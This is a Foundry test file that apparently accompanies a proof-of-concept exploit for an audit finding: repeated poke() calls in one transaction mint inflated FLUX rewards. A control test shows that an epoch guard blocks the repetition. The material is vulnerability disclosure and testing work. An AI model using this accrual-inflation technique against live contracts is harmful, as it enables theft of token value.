// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./38109-unauthorized-minting-of-unlimited-flux-in-1-transaction-immu.sol";

contract RepeatedPokeAccrualTest is Test {
    /// @notice HARM: run() proves 4 same-transaction poke() calls mint 4x the
    ///         legitimate one-time FLUX accrual.
    function test_exploit_repeatedPokeMintsInflatedFlux() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(
            e.flux().balanceOf(address(e)),
            e.CLAIMABLE_PER_EPOCH() * e.POKE_COUNT(),
            "attacker should have minted 4x the legitimate per-epoch amount"
        );
    }

    /// @notice Isolates the exact mechanism: N poke() calls in one transaction
    ///         accrue N times the per-epoch claimable amount.
    function test_buggyVoter_accrualMultipliesPerCall() public {
        VotingEscrow ve = new VotingEscrow();
        FluxToken flux = new FluxToken();
        Voter voter = new Voter(flux);
        flux.setVoter(address(voter));
        flux.setVotingEscrow(address(ve));
        flux.setOwner(1, address(this));
        ve.setClaimable(1, 1 ether);

        voter.poke(1);
        voter.poke(1);
        voter.poke(1);

        assertEq(flux.getUnclaimedFlux(1), 3 ether, "3 calls should accrue 3x");
    }

    /// @notice Control: with the onlyNewEpoch guard restored, a second poke()
    ///         call in the SAME epoch reverts — accrual is capped to once.
    function test_control_fixedVoter_blocksSecondPokeSameEpoch() public {
        VotingEscrow ve = new VotingEscrow();
        FluxToken flux = new FluxToken();
        VoterFixed voter = new VoterFixed(flux);
        flux.setVoter(address(voter));
        flux.setVotingEscrow(address(ve));
        flux.setOwner(1, address(this));
        ve.setClaimable(1, 1 ether);

        voter.poke(1); // first call succeeds
        assertEq(flux.getUnclaimedFlux(1), 1 ether, "first poke should accrue once");

        vm.expectRevert(bytes("already accrued this epoch"));
        voter.poke(1); // second call in the same epoch must revert
    }
}
